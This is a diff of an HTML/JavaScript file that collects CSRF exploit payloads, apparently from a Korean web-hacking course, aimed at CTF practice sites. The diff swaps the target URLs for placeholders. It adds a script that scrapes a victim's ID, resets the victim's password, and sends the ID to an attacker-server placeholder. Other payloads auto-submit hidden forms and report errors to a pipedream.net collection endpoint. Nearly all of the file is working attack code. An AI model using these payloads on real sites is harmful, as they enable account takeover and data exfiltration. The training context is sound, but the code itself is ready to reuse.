@@ -8,7 +8,7 @@
     <iframe width="0" height="0" frameborder="0" name="stealthcsrf" id="stealthcsrf" style="display: none"></iframe>
     <body onload="document.forms[0].submit()">
         <div width="0" height="0" style="display: none">
-            <form method="post" action="http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php" target="stealthcsrf">
+            <form method="post" action="" target="stealthcsrf">
                 <input name="pw" type="hidden" value="csrf" />
                 <input type="submit" value="Update" />
             </form>
@@ -20,9 +20,9 @@
 <script>
     async function csrfExploit() {
         try {
-            let url = "http://ctf.segfaulthub.com:5004/study/board_like_ok.php?idx=496";
+            let url = "공격 대상 페이지";
             let response = await fetch(url);
-            document.location.href = "http://ctf.segfaulthub.com:5004/file/upload/login.html";
+            document.location.href = "공격 대상 페이지";
         } catch (error) {
             let attackerUrl = "https://eodhhttu9beaqkb.m.pipedream.net?error=" + error;
             await fetch(attackerUrl);
@@ -35,7 +35,7 @@
 <!-- 2차 프로젝트 정보누출 CSRF -->
 <script>
     async function csrfExploit() {
-        let url = "http://ctf.segfaulthub.com:5005/login%20case%201/board/mypage_mod.php";
+        let url = "공격 대상 페이지";
         let response = await fetch(url);
         let html = await response.text();
         let parser = new DOMParser();
@@ -52,7 +52,7 @@
 <!-- 2차 프로젝트 CSRF -->
 <script>
     async function csrfExploit() {
-        let url = "http://ctf.segfaulthub.com:5005/login%20case%201/board/mypage_mod.php";
+        let url = "공격 대상 페이지";
         let response = await fetch(url);
         let html = await response.text();
         let parser = new DOMParser();
@@ -63,7 +63,7 @@
         let adress = dom.forms[0].adress.placeholder;
         let sex = "남";
         let email = "test@naver.com";
-        let attackerUrl = "http://ctf.segfaulthub.com:5005/login case 1/board/mypage_mod_ok.php";
+        let attackerUrl = "공격 대상 페이지";
         let resp = await fetch(attackerUrl, {
             method: "POST",
             body: new URLSearchParams({ userid, pw, name, adress, sex, email }),
@@ -78,7 +78,7 @@
 <!--3차 프로젝트 CSRF 해시 탈취 -->
 <script>
     async function csrfExploit() {
-        let url = `http://ctf.segfaulthub.com:9191/2_main_page.php`;
+        let url = `공격 대상 페이지`;
         let response = await fetch(url);
         let html = await response.text();
         let parser = new DOMParser();
@@ -99,7 +99,7 @@
 <!--3차 프로젝트 CSRF -->
 <script>
     async function csrfExploit() {
-        let url = `http://ctf.segfaulthub.com:9191/2_main_page.php`;
+        let url = `공격 대상 페이지`;
         let response = await fetch(url);
         let html = await response.text();
         let parser = new DOMParser();
@@ -117,7 +117,27 @@
             writeform.append("MAX_FILE_SIZE", "30000");
             writeform.append("file", "upload");
             writeform.append("pwd", "1234");
-            await fetch(`http://ctf.segfaulthub.com:9191/writePost.php`, { method: "POST", body: writeform });
+            await fetch(`공격 대상 페이지`, { method: "POST", body: writeform });
         }
     }
+</script>
+
+<!--4차 프로젝트 CSRF-->
+
+<script>
+async function csrf(){
+        let resp = await fetch("공격 대상 페이지");
+        let html = await resp.text();
+        let parser = new DOMParser();
+        let dom = parser.parseFromString(html, "text/html");
+        let getId = dom.getElementsByTagName("td")[2].innerHTML;
+        let mod_pw = 'attack';
+        await fetch('공격 대상 페이지', {
+                method: 'POST',
+                body: new URLSearchParams({mod_pw})
+        });
+        await fetch("공격자 서버 IP?x="+getId);
+}
+
+csrf();
 </script>
